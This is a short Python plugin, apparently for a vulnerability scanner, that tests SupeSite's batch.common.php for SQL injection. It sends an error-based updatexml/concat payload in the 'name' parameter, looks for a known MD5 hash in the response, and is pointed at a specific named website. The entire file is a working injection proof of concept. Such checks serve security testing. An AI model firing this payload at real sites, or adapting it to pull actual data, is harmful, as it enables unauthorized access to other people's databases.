#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service, arg):
    if service == "supesite":
        return True, arg

def audit(arg):
    url = arg
    url = url + 'batch.common.php?action=modelquote&cid=1&name=members%20where%201=1%20and%201=(updatexml(1,concat(0x5e24,(select%20md5(521521)),0x5e24),1))%23'
    code, head, body, _, _ = curl.curl(url)
    if code == 200:
        if body and body.find('35fd19fbe470f0cb5581884fa7006') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('supesite', 'http://www.jhgjs.com/')[1])
